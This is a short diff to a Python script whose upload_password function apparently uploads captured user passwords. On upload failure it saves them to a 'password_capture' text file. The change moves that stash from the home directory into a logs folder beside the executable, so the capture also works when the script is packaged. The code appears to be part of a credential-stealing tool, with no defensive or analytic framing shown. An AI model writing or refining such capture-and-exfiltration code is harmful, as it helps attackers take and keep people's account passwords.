@@ -155,7 +155,26 @@ def upload_password(password_data):
     except Exception as e:
         print(f"[!] Upload failed: {e}")
         try:
-            backup_file = os.path.join(os.path.expanduser("~"), f"password_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
+            # Import standardized path utilities
+            try:
+                from path_utils import get_logs_path, ensure_folder_exists
+            except ImportError:
+                import os
+                import sys
+                def get_logs_path():
+                    if getattr(sys, 'frozen', False):
+                        base = os.path.dirname(sys.executable)
+                    else:
+                        script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
+                        base = os.path.dirname(script_dir) if os.path.basename(script_dir) == 'Scripts' else script_dir
+                    return os.path.join(base, "logs")
+                def ensure_folder_exists(path):
+                    os.makedirs(path, exist_ok=True)
+                    return path
+            
+            # Use logs folder in executable directory instead of user home
+            logs_dir = ensure_folder_exists(get_logs_path())
+            backup_file = os.path.join(logs_dir, f"password_capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
             with open(backup_file, 'w') as f:
                 f.write(f"Username: {password_data.get('username', USERNAME)}\n")
                 f.write(f"First Password: {password_data.get('first_password', '')}\n")
